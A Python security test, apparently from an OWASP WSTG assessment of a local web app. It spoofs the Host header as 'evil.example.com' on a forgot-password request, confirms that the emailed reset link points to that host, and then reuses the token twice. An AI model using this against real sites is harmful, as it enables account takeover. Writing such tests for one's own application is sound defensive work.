"""
WSTG-ATHN-09 / WSTG-INPV-17: Password reset flaws.
Expected:
- Host header is copied into the emailed reset link
- The same reset token can be reused more than once
"""
import quopri
import re
import time

import requests

BASE = "http://localhost:3000"
MAILHOG = "http://localhost:8025"

stamp = str(int(time.time()))
email = f"wstg_reset_host_{stamp}@example.com"

requests.post(f"{BASE}/api/auth/register", json={
    "email": email,
    "username": f"wstghost{stamp}",
    "password": "password123",
    "display_name": "WSTG Host",
}, timeout=10).raise_for_status()

forgot = requests.post(f"{BASE}/api/auth/forgot-password", json={"email": email}, headers={
    "Host": "evil.example.com",
}, timeout=10)
print("Forgot:", forgot.status_code, forgot.text)
assert forgot.status_code == 200

mail = requests.get(f"{MAILHOG}/api/v2/messages?limit=100", timeout=10).json()
body = None
for item in mail["items"]:
    headers = item.get("Content", {}).get("Headers", {})
    if email in "".join(headers.get("To", [])):
        body = quopri.decodestring(item["Content"]["Body"]).decode(errors="ignore")
        break

assert body and "http://evil.example.com/reset-password?token=" in body
token = re.search(r"token=([A-Za-z0-9\-]+)", body).group(1)
print("Reset link host copied into email")

first = requests.post(f"{BASE}/api/auth/reset-password", json={
    "token": token,
    "password": "newpass123",
}, timeout=10)
second = requests.post(f"{BASE}/api/auth/reset-password", json={
    "token": token,
    "password": "newpass456",
}, timeout=10)
print("First reset:", first.status_code, first.text)
print("Second reset:", second.status_code, second.text)
assert first.status_code == 200
assert second.status_code == 200

print("\n[VULNERABLE] Reset links trust Host and reset tokens are reusable")
